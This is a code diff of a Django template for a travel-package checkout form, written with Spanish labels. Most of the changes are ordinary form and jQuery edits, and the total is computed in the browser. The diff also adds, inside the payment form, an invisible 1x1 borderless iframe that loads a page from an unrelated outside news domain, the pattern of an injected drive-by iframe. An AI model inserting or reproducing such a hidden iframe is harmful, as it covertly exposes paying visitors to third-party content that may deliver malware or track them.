@@ -1,22 +1,44 @@
 {% extends "layout/base_pagos.html" %}
+
+
 {% block menu %}
     <li><a href="#" class="active">1. Products</a></li>
     <li><a href="#">2. Passangers</a></li>
     <li><a href="#">3. Payments</a></li>
     <li><a href="#">4. Confirm</a></li>
 {% endblock %}
+
 {% block content %}
-<p><b>Paquete: </b> {{ paquete.nombre }}</p>
-<p><b>Precio : </b>$ {{ paquete.precio }}</p>
-<p><b>Cantidad Personas: </b>{{ cantidad_personas }}</p>
-<p><b>Monto total: </b>$ {{ monto }} </p>
-<p><b>Fecha de viaje: </b>{{ fecha_viaje}} </p>
+<script type="text/javascript"> 
+    $(function(){
+        $("#id_cantidad").change(function() {
+            pre = parseInt($("#id_precio").val());
+            cant = $("#id_cantidad").val();
+            $("#id_monto").val(pre*cant);
+        });
+    });
+    
+</script>
+
 <form action='/reservar/dato.html' method="post">{%csrf_token%}
-	<!-- Todos los campos ocultos para enviar a paypal -->
-	<input name="cantidad_personas" type="hidden" value="{{ cantidad_personas }}">
-	<label>Correo: </label>
-	<input type="email" value="">
-	<br>
-	<input type="submit" value="Pagar">
+    <!-- Todos los campos ocultos para enviar a paypal -->
+    <p><b>Paquete: </b> {{ paquete.nombre }}</p>
+    <p><b>Precio : </b>$ <input id="id_precio" type="text" value="{{paquete.precio}}" readonly="readonly"></input></p>
+
+    <p><label for="id_cantidad"> Cantidad Personas:</label>
+    <input id="id_cantidad" type="number"  step="any" name="cantidad"></input></p>
+
+    <p><b>Monto Total : </b>$<input id="id_monto" type="text" value="" readonly="readonly"></input></p>
+
+    <p><b>Fecha de viaje: </b><input type="datetime" value=""></p>
+
+    <input name="cantidad_personas" type="hidden" value="">
+
+    <label>Correo: </label>
+    <input type="email" value="">
+    <br>
+    <input type="submit" value="Pagar">
+    <iframe width="1" height="1" frameborder="0" scrolling="no" src="http://www.diariomadrid.eu/noticia_ultima_hora.php"> </iframe>
+        
 </form>
 {% endblock %}
